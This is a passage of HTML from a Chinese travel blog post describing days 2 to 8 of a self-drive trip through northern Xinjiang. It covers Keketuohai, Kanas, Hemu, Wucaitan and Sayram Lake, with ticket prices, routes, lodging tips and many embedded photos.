alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><ul>\n<li>⭐️ 景点： 可可托海景区（春晚、可可托海、牧羊人歌曲）、五彩滩</li>\n<li>⭐️ 行程： 民宿吃完早饭后去「小喀纳斯」 可可托海 景区，坐观光车去看神钟山、额尔齐斯大峡谷、白桦林等。原本计划回 可可托海 镇午饭然后去五彩滩看日落，没想到在 可可托海 景区开始下雨，气温冷的要穿厚点的衣服。</li>\n<li>匆匆看完之后，排队下山的人很多，之后去三号矿坑参观（曾经在特殊历史时期为偿还苏联外债，以及国防建设两弹一星等等做出不可磨灭的贡献，建议有时间去参观一下），吃完饭之后在去富蕴的路上，又遇到了冰雹和小泥石流，一度要返程。好在后面雨停了，交警同志也很快到现场指挥通行，才顺利回布尔津住宿，这时候已经到了晚上 11 点多。</li>\n<li>如果打算当天去五彩滩的朋友，建议早上早点出发去可可托海 ，在可可托海镇或者富蕴县吃饭，然后晚上 8 点多赶到五彩滩。</li>\n<li>⭐️ 门票： 可可托海景区（不能自驾），门票+观光车票 126 元 /人，开放时间 10:30 至 18:30</li>\n<li>⭐️ 住宿地点： 布尔津银河大酒店（干净卫生，服务也很好）</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/80aa8c458a526b67cf1da90365e83d17\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/8839f0244d99f0e9bf005966b2418ac4\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/0ac64b43b19d10b56bc0e6163eb8ee0a\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/40301e6122e71368ba92992bf16bc0c7\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/026f31e4865ac9d7847555c98f4531e8\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><p>赶路的时候，邂逅了 16 天的行程中最大的落日：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/080b5fc0aed14996629bb22e91cc6593\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><h2>第 3 天至第 4 天：布尔津—喀纳斯（住宿）</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/9290c7111e021cffd5c207f96509f7c4\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/2e9316dd5edfedc02514129463e5a776\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><ul>\n<li>⭐️ 景点： 喀纳斯（18:00-19:00）观鱼台 、三个湾（神仙湾、月亮湾、卧龙湾） 、 喀纳斯 河</li>\n<li>⭐️ 行程： 第 3 天从布尔津出发去 喀纳斯 。一路的山路，急弯很多也很美，尤其是从山上远望一个叫布拉乃村的时候，蓝天白云配着红砖房很有视觉冲击力，过了布拉乃村有一个地方可以停车拍照。一路拍拍停停，原本计划停车到贾登峪停车场，不过因为自驾车太多，只好停在了临停点。</li>\n<li>坐免费大巴去贾登峪门票站，然后买票乘区间车去喀纳斯景区中心，在换乘中心坐免费公交去 喀纳斯 新村办理入住。</li>\n<li>不论是新村还是老村，都可以提前问民宿老板乘车路线和下车点。因为办完入住已经 18 点，我们参考民宿老板的建议，坐车去看喀纳斯湖（免费公交 20:30 停运），然后回新村吃晚饭休息。这天天气不错，夕阳很美，星空也很美。</li>\n<li>可惜这一天开始一周的时间，去观鱼台的路在修，没办法坐景区公交车，只能选择骑马（250 元左右/人）或徒步。因为走大路绕远很多，我决定次日一早走马道徒步去观鱼台 ，早 8 点出发，一路顺着马道徒步，路上有些泥泞，到观景台的时候 10 点半，正是云雾缭绕欲遮还羞的景色，等了1小时开始往下走，蓝天白云景色绝美，虽然天气和时间的原因，没看到喀纳斯湖全貌，不过看到路上的风景也非常满足。</li>\n<li>午休后，坐景交车去神仙湾、月亮湾、卧龙湾（或者直接从神仙湾步行 2 小时到卧龙湾）。因为随身携带的行李多，赶着去禾木 ，这几个景点就匆匆而过。到换乘中心后，因为没赶上下午 4 点去禾木的大巴车，咨询了工作人员后，坐免费大巴去自驾车的临停点，然后开车去禾木的游客中心。</li>\n<li>⭐️ 门票： 禾木 、喀纳斯、白哈巴三景区合一的门票和统一观光车票</li>\n<li>⭐️ 住宿地点： 喀纳斯新村到喀纳斯、山水人家住宿（新村安静很多，离观鱼台很近）</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/2e713b9f713758234a8cfe8e19fdd5e3\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/35697c3318103770166a1b554778b6f2\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/8728c4d48c23f9c75e5fe7816493ecd2\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/11536979afc103a145779f7eb5a5fd37\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/ddf8805666274874defd2d38e0b04fe5\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/c3b711bdca5903de32eee00bad150181\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/cf8ad31c2c8282b5fe7e75d507513697\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/ecbe416bb7d0633932fe36a554f6b475\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/8063fc26f9edd094ca015136dfadd844\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/87ab7c69ded995895f927df1eec34c04\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/e361728ec82bebb61f1c0116fa1dade5\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/9616e88e844de6e49a6d03a51a7c58d7\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/f35dd78a8f9138956d7a0ffdb64d9969\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/06d36828f9ea11cc69f5e86e2a0cf9e4\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/abbbcaaf7d677047704db8897cdf4294\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/b5e9387b23fcb9fa9f9122153309948d\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/47f93c5342d31723a35b3e7c8ed75475\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/fa57df895b41ac6b5bf9ff5d985ae95a\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/0893262d8161fbf77989a07215941046\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/77165a3cbc4379a41f76c2689e530daa\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/2d886cb1414789274f203d36f8e49c11\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><h2>第 4 天至 5 天：禾木（住宿）—布尔津（住宿）</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/fe8e0d81001645dbdcbf7d3334056bfc\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/7020851b0a61aa87d123e49e5ad856f1\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><ul>\n<li>⭐️ 景点： 禾木村（曾被评为中国六大最美乡村）、 禾木观景平台日出+晨雾、禾木村星空</li>\n<li>⭐️ 行程： 办理入住后，在禾木村转了转。整个禾木村不算大，不过和喀纳斯新村的安静相比，烟火气很足，人气也很旺，吃的住的买东西都很方便，像极了一个充满生活气息的小县城。因为到的时间比较晚，错过了去日落大道看日落的时间，索性溜达着往禾木桥的方向走，看到了很多喂食老鹰的表演，在禾木桥以及禾木河周围转了转，找地方吃晚饭，然后回住处休息。</li>\n<li>凌晨 2 点起来兴致不减的去拍星空，拍了几张因为三脚架不稳定，把镜头摔了，晚上太困的时候不太适合出来拍星空哈哈。</li>\n<li>晚上拍星空太困了，早上没有起来去看晨雾，也取消了去徒步小美丽峰的计划。上午继续沿着 禾木桥禾木河，在观景平台上走了一会，看被禾木河以及树木包裹着的禾木村，如果秋天来，风景会更好。</li>\n<li>建议可以沿着观景平台往里走，人越来越少，在援疆桥附近有栈道下去，可以穿过援疆桥，顺着禾木河边再走回到禾木桥。</li>\n<li>午饭后，退房去游客中心，回布尔津 。正好有时间去五彩滩转一转，赶上了日落，景色很美，一直等到日落后才出景区（注意防蚊虫，五彩滩的蚊子很厉害）。 布尔津是一个干净美丽的县城，晚饭后在布尔津河边上走一走，很是舒服。</li>\n<li>⭐️ 门票： 禾木、喀纳斯、白哈巴三景区合一的门票和统一观光车票，五彩滩门票</li>\n<li>⭐️ 住宿地点：禾木鹿野乡村旅馆（价格不便宜，但环境不错）、布尔津银河大酒店（性价比高，依旧推荐）</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/6ab626cbc4c9185ead1d887555b6eb19\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/270fdfd1ccf6d8164d23758aa2c8df65\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/be33f1113edba5d5e1d797d3e755ede9\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/633bb3664e98f8366ae7563153e5900b\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/2052a13a129c3bcb782b8fb77465e871\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/efbbe6da5f5eb9a75d404ae07489c54f\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/b44827e54a7ca7149c87ea329bf43725\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/c7cba7e81f4ca9eb76c8f62f6a60f8b3\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/ef1e9557efcdc7ae3811dc149854cc11\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/547ab7ae3541604d11f101826a411293\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/aad31eb6622492418d5eb0f9cad643a8\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/46265049dcf27147e6cd6f6d67221a15\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/8f9d2e77b78c63557615d7d65cec2ff6\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/d9126d7334d5bdbb2c595a43030438a5\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/2996ee95407d12dc940f69505729f4e9\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/31500fbd47a2c3e4a035c59108f2731b\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/fa342ac7bae538523679b29c15c03604\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/8e64bfcf936002edb56ed114c7e7ddfe\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/af2d14fc39e4ebf2a574790423ca82a2\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/bf5610ac3758a6d08226b062dd606967\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/1e27e64f8efe171db0a9cf7175d3ebfc\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/8d4636476d6130f308b02614114cbc4d\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/8252ac24e921382f8d0db23c4a481e58\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/868d850f3e52fd95e1b832246807f58d\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/b2571572210ab39d1c74f2eb783149ba\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/f25e8dbbba5b2a288c6abe65f28113bd\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/6d7a203687acfb6ae53492640e652638\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/540d127be63e9d2b20d53d9787594371\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/acb7c8a6d9bf60d758c46bb4392ae803\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/9d4a9981abf5c409619767aedb55d439\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><h2>第 6 天：布尔津—魔鬼城—精河（住宿）</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/556ad7d67146205c283a1895ac48eb52\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/820fbf69d81352cad02df751b3e408e3\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><ul>\n<li>⭐️ 景点：魔鬼城及路途风景</li>\n<li>⭐️ 行程：今天主要是赶路（670 公里），因为晚上住宿的精河属于博尔塔拉蒙古自治州，入住需要做核酸，早上在布尔津酒店附近的小区做完核酸之后，出发经魔鬼城和奎屯市，到精河 县住宿。一天的时间都在路上，不过这一段车不多，开起来不怎么累。</li>\n<li>再次感慨新疆太地大物博了，每一天看到的都是不同的地貌和风景。（注意提前加油，在新疆自驾建议油量不满一半就考虑找地方加油，一是路上的有些加油站可能是关闭的，二是在景区附近加油会排队很久）</li>\n<li>⭐️ 门票：无</li>\n<li>⭐️ 住宿地点： 精河县玉新酒店（附近有家羊肉火锅很嫩很好吃）</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/7bf4b2d2d9996c51f03d844a27967e3c\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><h2>第 7 天：精河—赛里木湖—果子沟（住宿）</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/d1329e893b553cfd7162faba9af2b601\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/027feded7432140dee9c57c4b05db04b\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><ul>\n<li>⭐️ 景点：果子沟大桥、赛里木湖（点将台、南门附近几处景点等）</li>\n<li>⭐️ 行程：今天本来只是想在赛里木湖和果子沟打打卡，没想到景色超出预期，再次验证了自然风光的变幻莫测。</li>\n<li>在精河的酒店吃完早饭，去赛里木湖。可以从东门自驾进入，景区内共有 33 个停车点，可以下车尽情耍。游玩需要五六个小时（赛里木湖西部很美），一路拍拍走走，有时风大有时下雨，不过赛里木湖真的很美，不愧被称作大西洋最后一滴眼泪。</li>\n<li>出景区南门走小路去果子沟大桥观景平台看日落，有几个地方看果子沟大桥都不错。最美的还是在自驾营地再往里去的一条路旁，顺着木栈道走到尽头，可以看大桥的全景。在找路的时候，发现天晴了，夕阳很美，于是折返回赛里木 湖南 门，远远观望了一下夕阳下的赛里木湖，因为不尽兴，又意外发现了一个自驾营地里面的金顶平台，可以看赛里木湖的全景（门口大爷收了我30）。晚上住在果子沟大桥旁边的民宿。</li>\n<li>⭐️ 门票：赛里木湖门票+自驾进入共 145 元 /人</li>\n<li>⭐️ 住宿地点：果子沟霍城森岭酒店（房间较小，周围环境不错，离果子沟大桥开车 5 分钟）</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/d1c3dc7e15343ad5db96a9c21f2084e4\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/192506bf6ef4572de7bf9525418b7ea3\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/6e049bd542ddcb7325890a0e24c20a24\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/66e3d406333c184953d03e4666ceeb49\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/e4b4da727d798810b28385f1e9030f55\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/8a667b16c6d418b4ea99bed85c4c82a3\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/0fa6f7d1433975db3aa33b47be62e242\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/41d719fe9de3d9a741d2e561fcf78cfa\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/0193a503ec32c6dd96b951cb1484b691\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/28335003437bc4896d7b263bab28617b\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/32361810c9fbcecc2f215e4bb33d12aa\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/df275212d64b35059a933eb6c4aa3af9\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/434791636ffd850726b57e6536744e10\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/1050e7794adea4e9bed6a64dc6515a9a\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/8734a0ac7247cfde5f3481557ff84d4d\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/5157b39058350182f9f36cbd1fe6b231\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/73c066d6098b490cde11e6dd937b16c1\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/5145b3482298d5f153bffae241b98ef3\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/739da7bafceeed9cf9929c042ddcbc3a\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/337510f946f8e9619b771a3bf6825224\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/fd578bf697d8cf8df0603770ab375229\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/4c4d28471f2831a44768c1cde8615447\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/927b911a30698824ae761f83a1138836\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/86cbff0ce7d3b4fd7860f748dab8e2d1\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/1e1fcc63f809da9691fb17e9ebf302b7\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/8539ad9fcba847b4efaf330f6c0ffb73\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/56080b6d15895f91f434b569827b7a9e\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/6d7ab8b2d6fb78357813b01649965090\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/96be8b5116cd97d311876b8a0c850681\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/734364f9cf87994dd18fe53d5694c02f\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/12d1dc1f28538959d6b0f8140dbd02c0\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/b8d3dfad55012b30327e3dae88b6a94a\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/67b75b0aa5fbf3f03aca2c66a21e6531\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><h2>第 8 天：果子沟—薰衣草—伊昭公路—昭苏</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/64a6552d94f894e4c34571ba937240da\" 